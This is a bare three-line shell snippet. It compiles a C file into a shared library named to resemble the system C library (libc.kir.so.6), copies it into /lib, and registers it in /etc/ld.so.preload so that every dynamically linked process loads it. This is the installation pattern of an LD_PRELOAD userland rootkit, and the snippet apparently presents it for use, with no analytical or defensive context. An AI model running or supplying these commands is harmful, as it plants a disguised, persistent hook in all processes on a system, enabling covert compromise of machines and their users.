gcc kirito.c -fPIC -shared -o libc.kir.so.6 -ldl
mv libc.kir.so.6 /lib/
echo "/lib/libc.kir.so.6" > /etc/ld.so.preload
